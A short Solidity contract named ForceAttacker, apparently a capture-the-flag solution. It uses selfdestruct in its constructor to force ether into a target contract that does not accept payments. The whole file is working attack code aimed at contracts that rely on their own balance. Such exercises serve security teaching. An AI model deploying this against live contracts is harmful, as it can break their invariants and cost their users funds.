pragma solidity ^0.7.3;

contract ForceAttacker {
    constructor(address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}
